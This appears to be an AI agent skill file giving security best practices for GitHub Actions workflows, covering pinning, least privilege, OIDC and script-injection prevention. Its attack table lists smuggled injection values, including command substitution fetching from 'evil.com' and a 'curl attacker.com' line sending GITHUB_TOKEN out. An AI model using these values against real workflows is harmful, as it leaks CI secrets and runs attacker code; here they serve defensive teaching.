---
name: github-action
description: Guides best practices when authoring GitHub Actions.
license: MIT
metadata:
  author: OpenCode
  version: "1.0.0"
  domain: ci
  triggers:
    - GitHub Actions
    - CI/CD
    - workflows
  role: specialist
  scope: operational
  output-format: code
---

# GitHub Actions Skill

## Purpose

Provide best practices for GitHub Actions workflow implementation, following organization-wide golden path standards for CI/CD pipeline design, security, and reusability.

## Pipeline Architecture

Follow the standard pipeline lifecycle for delivery pipelines:

```
Build → Publish Snapshot → Test → Promote to Artifact → Deploy
```

**Key Principles:**

- Deployed artifact is identical to tested artifact (confidence)
- Never rebuild in production—only deploy promoted artifacts
- Never overwrite published artifacts—create new versions
- Separate operational automation (migrations) from deploy steps
- Use `workflow_call` for workflow composition and reusability
- Pin all `uses:` references to full commit SHAs (not floating tags)

## Logging and Messaging

- Use the `::debug::` command early in a workflow step to emit detailed context for rare failures.
- Emit `::notice::` for informational issues that warrant attention without failing the run.
- Use `::warning::` (with `title=` when helpful) when a non-fatal condition needs highlighting.
- Emit `::error::` when a step should fail because of missing requirements or invalid output; provide `file=` and range metadata for precise diagnostics.

### Example Commands

```bash
echo "::debug::Set the Octocat variable"
echo "::notice file=app.js,line=1,col=5,endColumn=7::Missing semicolon"
echo "::warning file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon"
echo "::error file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon"
```

## Security Best Practices

### Environment Isolation & Branch Protection

Enforce clear separation between unapproved code (PRs/branches) and approved code (`main`):

```yaml
jobs:
  deploy-prod:
    environment: production # branch restriction: main only
    permissions:
      id-token: write
      contents: read
```

Also configure OIDC trust policy in cloud provider to restrict which branch/environment can assume production identity.

### Action Pinning

Pin all GitHub Actions to specific commit SHAs to prevent supply-chain attacks. Always include the version tag as a comment for reference.

**Good — Pin to commit SHA:**

```yaml
uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
```

**Bad — Do not use floating tags:**

```yaml
uses: actions/checkout@v4
uses: actions/checkout@main
```

To find the commit SHA for a specific tag:

```bash
# Step 1. Get the latest release information
curl -s https://api.github.com/repos/{owner}/{repo}/releases/latest | yq '.tag_name'

# Step 2. Get the commit SHA for a specific tag
curl -s https://api.github.com/repos/{owner}/{repo}/git/ref/tags/{tag_name} | yq '.object.sha'
```

### Least-Privilege Permissions

Define minimal required permissions at both workflow and job levels. Only grant necessary scopes.

```yaml
jobs:
  build:
    permissions:
      contents: read
      id-token: write # only if using OIDC for cloud auth
```

### Secret Management Hierarchy

Prefer in this order:

1. **Cloud secret stores** (Azure Key Vault, AWS Secrets Manager) — fewer rotation points, better auditing
2. **GitHub Actions secrets** — only for CI-specific values (e.g., GitHub App keys)

Pattern: Use OIDC to authenticate, then fetch from cloud store. Never accept long-lived cloud credentials as inputs.

### OIDC for Cloud Authentication

Use OpenID Connect (OIDC) for cloud provider authentication instead of long-lived credentials or personal access tokens. This provides short-lived tokens with fine-grained control.

### Script Injection Prevention

Script injection is a **critical security vulnerability** where user-controlled values in shell commands are interpreted as code, not data. Always assign context values to environment variables first to prevent code execution.

#### Understanding the Risk

When you use context variables directly in `run:` scripts, the shell interprets them as **code**:

```yaml
# ❌ VULNERABLE
- run: curl -X POST https://api.example.com/deploy -d "user=${{ github.actor }}"
```

#### Common Attack Scenarios

If `github.actor`, PR titles, or similar values contain shell metacharacters, injection can occur:

| Scenario             | Malicious Value                               | Result                        |
| -------------------- | --------------------------------------------- | ----------------------------- |
| Command injection    | `test; <run arbitrary command here>`          | Executes arbitrary commands   |
| Command substitution | `$(curl evil.com)`                            | Executes remote code          |
| Quote escaping       | `foo'bar'$(whoami)`                           | Breaks syntax, executes code  |
| Secret exfiltration  | `pass; curl attacker.com?token=$GITHUB_TOKEN` | Leaks credentials to attacker |

#### Safe Pattern: Use Environment Variables

**Always** assign user-controlled values to environment variables first, then reference them:

```yaml
# ✅ SAFE
- name: Deploy safely
  env:
    ACTOR: ${{ github.actor }}
    BRANCH: ${{ github.ref }}
    API_KEY: ${{ secrets.API_KEY }}
  run: |
    curl -X POST https://api.example.com/deploy \
      -d "user=$ACTOR" \
      -d "branch=$BRANCH" \
      -d "token=$API_KEY"
```

**Why it works:** Environment variables are treated as literal data by the shell. Metacharacters like `$`, `;`, `|` are literal text, not interpreted as code.

#### Approach Comparison

| Approach                | Usage                                              | Risk Level  | Notes                             |
| ----------------------- | -------------------------------------------------- | ----------- | --------------------------------- |
| Direct interpolation    | `echo "${{ vars.FOO }}"`                           | 🔴 Critical | Vulnerable to injection attacks   |
| Env variable assignment | `env: { VAR: ${{ vars.FOO }} }` then `echo "$VAR"` | 🟢 Safe     | **Recommended approach**          |
| Single quotes           | `echo '${{ vars.FOO }}'`                           | 🟡 Risky    | Prevents some attacks but not all |

#### Key Rules

**✅ Must Do:**

- **Always** assign context values to env variables before using in shell
- Use double quotes when referencing env variables: `"$VAR"` not `$VAR`
- Mask sensitive values with `::add-mask::` before use in scripts

**❌ Must NOT Do:**

- Direct interpolation in run commands: `${{ vars.FOO }}`
- Inline execution of secrets: `${{ secrets.PASS }}`
- Command substitution with context values: `echo "$(eval ${{ vars.CMD }})"`
- Unquoted variables: `echo $VAR` (allows word splitting and globbing)

#### Best Practice Template

```yaml
- name: Process user input safely
  env:
    # Assign ALL dynamic values from context/secrets/variables first
    PR_TITLE: ${{ github.event.pull_request.title }}
    BUILD_ID: ${{ github.run_id }}
    CONFIG: ${{ vars.MY_CONFIG }}
    API_TOKEN: ${{ secrets.API_TOKEN }}
  run: |
    # Reference via environment variables only
    echo "PR: $PR_TITLE"
    curl -H "Authorization: Bearer $API_TOKEN" \
      -d "config=$CONFIG&build=$BUILD_ID" \
      https://api.example.com/deploy
```

### Credential Persistence

Disable credential persistence on checkout actions to prevent credentials from being persisted to disk.

```yaml
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
  with:
    persist-credentials: false
```

### Secret Masking

Mask sensitive values before use to prevent accidental exposure in logs.

```yaml
- run: |
    echo "::add-mask::${{ secrets.SENSITIVE_VALUE }}"
    echo "Using masked value: ${{ secrets.SENSITIVE_VALUE }}"
```

## Shared Workflows & Reusability

**Central Repository:** [footholdtech/actions](https://github.com/footholdtech/actions)

Check shared workflows before writing new pipeline code. Shared workflows encode org-wide standards (tool versions, lint checks, security scans) and eliminate maintenance burden.

**How to Reference:**

```yaml
uses: footholdtech/actions/.github/workflows/go-test.yml@<commit-sha>
```

Always pin to full commit SHA. Contributing guidelines: [CONTRIBUTING.md](https://github.com/footholdtech/actions/blob/main/CONTRIBUTING.md)

## Custom Actions

**Prefer composite actions** for most cases—simplest to read, review, and maintain.

**Action Types:**

- **Composite** - Fastest; for bundling steps or `uses:` references
- **JavaScript** - Logic-heavy; use `@actions/core` SDK
- **Docker** - When specific environment/dependencies needed (Linux only, slower)

**Security in Custom Actions:**

- Never interpolate inputs directly: use environment variables instead
- Mask sensitive values with `echo "::add-mask::$SECRET"`
- Document required permissions in README
- Validate inputs early; fail with clear error

## Constraints

### Must do

- Pin all action references to specific commit SHAs (with version tags as comments)
- Define explicit least-privilege permissions for all jobs
- Prevent script injection by assigning user-controlled values to environment variables
- Disable credential persistence on checkout actions when not needed
- Run workflow validations with `actionlint` and `zizmor` after touching any GitHub Actions files
- Use OIDC for cloud authentication instead of long-lived credentials
- Mask secrets before use in workflow steps
- Use GitHub Environments with branch restrictions for production deployments
- Configure OIDC trust policies in cloud provider for cross-account protection
- Check shared workflows repo before writing new pipeline code
- Never rebuild in production—only deploy previously promoted artifacts
- All pipelines must be in code (`.github/workflows/`)—no manual click-to-deploy

### Should do

- Use GitHub App instead of Personal Access Tokens for automation
- Set `timeout-minutes` on all jobs to prevent runaway executions
- Use `workflow_call` for workflow composition and reusability
- Expose workflow outputs for downstream job composition
- For high-privilege pipelines (disaster recovery, data migration), use GitHub Environments with required reviewers
- Document GitOps boundaries—pipeline should only update fields it owns (e.g., image tag, not infrastructure)

### Validation

Run before committing changes to `.github/workflows/`:

```bash
actionlint                 # Syntax/semantic validation
zizmor .                   # Security static analysis
```
